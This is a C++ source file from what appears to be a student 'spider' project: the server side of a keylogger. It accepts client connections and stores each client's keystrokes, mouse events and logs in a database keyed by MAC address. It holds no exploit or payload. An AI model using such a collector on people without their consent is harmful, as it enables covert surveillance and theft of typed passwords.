//
// Server.cpp for Server in /home/plasko_a/projet/cplusplus/cpp_spider
// 
// Made by Antoine Plaskowski
// Login   <antoine.plaskowski@epitech.eu>
// 
// Started on  Sat Oct 24 17:20:22 2015 Antoine Plaskowski
// Last update Sun Nov  8 22:58:58 2015 Antoine Plaskowski
//

#include	"Server.hpp"

#include	"unistd.h"

Server::Server(Option const &option) :
  m_dll_idatabase(option.get_path_lib_idatabase()),
  m_dll_itime(option.get_path_lib_itime()),
  m_dll_iprotocol(option.get_path_lib_iprotocol()),
  m_dll_isocket(option.get_path_lib_isocket()),
  m_new_idatabase(m_dll_idatabase.get_symbole<fct_new_idatabase, ref_new_idatabase>(NAME_FCT_NEW_IDATABASE)),
  m_new_itime(m_dll_itime.get_symbole<fct_new_itime, ref_new_itime>(NAME_FCT_NEW_ITIME)),
  m_new_iprotocol(m_dll_iprotocol.get_symbole<fct_new_iprotocol, ref_new_iprotocol>(NAME_FCT_NEW_IPROTOCOL)),
  m_iselect(m_dll_isocket.get_symbole<fct_iselect, ref_iselect>(NAME_FCT_ISELECT)),
  m_new_iserver(m_dll_isocket.get_symbole<fct_new_iserver, ref_new_iserver>(NAME_FCT_NEW_ISERVER)),
  m_new_istandard(m_dll_isocket.get_symbole<fct_new_istandard, ref_new_istandard>(NAME_FCT_NEW_ISTANDARD)),
  m_database(m_new_idatabase(option.get_host_database(), option.get_port_database(), option.get_user_database())),
  m_server(m_new_iserver(option.get_host(), option.get_port())),
  m_in(m_new_istandard(ISocket::In)),
  m_clients(),
  m_timeout(m_new_itime())
{
  m_database.select_db("spider");
  m_timeout.set_second(10);
  m_timeout.set_nano(0);
}

Server::~Server(void)
{
  delete &m_database;
  delete &m_server;
  delete &m_in;
  for (auto it = m_clients.begin(); it != m_clients.end(); it++)
    delete *it;
}

bool	Server::run(void)
{
  select();
  try
    {
      if (m_server.can_read() == true)
	m_clients.push_back(&m_new_iprotocol(m_server.accept(), m_new_itime()));
    }
  catch (std::exception &e)
    {
      std::cerr << e.what() << std::endl;
    }
  if (m_in.can_read() == true && command() == true)
    return (true);
  for (auto it = m_clients.begin(); it != m_clients.end(); it++)
    {
      try
	{
	  if ((*it)->run(&m_timeout) == true)
	    throw std::exception();
	  else
	    {
	      auto &keyboard = (*it)->get_keyboard();
	      for (auto key = keyboard.begin(); key != keyboard.end(); key++)
		{
		  m_database.insert_keyboard((*it)->get_mac_address(), **key);
		  delete *key;
		}
	      keyboard.clear();
	      auto &mouse = (*it)->get_mouse();
	      for (auto key = mouse.begin(); key != mouse.end(); key++)
		{
		  m_database.insert_mouse((*it)->get_mac_address(), **key);
		  delete *key;
		}
	      mouse.clear();
	      auto &log = (*it)->get_log();
	      for (auto key = log.begin(); key != log.end(); key++)
		{
		  m_database.insert_log((*it)->get_mac_address(), **key);
		  delete *key;
		}
	      log.clear();
	    }
	}
      catch (std::exception &e)
	{
	  std::cerr << e.what() << std::endl;
	  delete *it;
	  *it = nullptr;	      
	}
    }
  m_clients.remove(nullptr);
  return (false);
}

bool	Server::command(void)
{
  uint8_t	buf[4096];
  uintmax_t	ret = m_in.read(*buf, 4096);

  if (ret == 0)
    return (true);
  std::string	input(reinterpret_cast<char *>(buf), ret);

  if (input == "client\n")
    for (auto it = m_clients.begin(); it != m_clients.end(); it++)
      std::cout << (*it)->get_mac_address() << std::endl;
  else if (input == "show\n")
    for (auto it = m_clients.begin(); it != m_clients.end(); it++)
      m_database.show((*it)->get_mac_address());
  return (false);
}

void	Server::select(void)
{
  m_in.want_read();
  m_server.want_read();
  for (auto it = m_clients.begin(); it != m_clients.end(); it++)
    (*it)->select();
  m_iselect(nullptr);
}
